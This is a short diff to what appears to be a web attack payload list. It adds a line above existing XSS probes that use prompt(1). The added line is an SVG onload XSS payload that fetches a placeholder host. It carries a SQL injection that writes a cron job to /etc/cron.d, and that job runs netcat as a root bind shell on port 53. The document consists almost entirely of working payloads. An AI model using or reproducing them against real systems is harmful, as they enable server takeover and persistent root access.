@@ -1,3 +1,4 @@
+<svg onload=fetch("//HOST/?id=0+union+select'*+*+*+*+*+root+/bin/nc+-lp53+-e+/bin/sh'into+outfile'/etc/cron.d/s'")>
 </script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><img src=x onerror=prompt(1)>
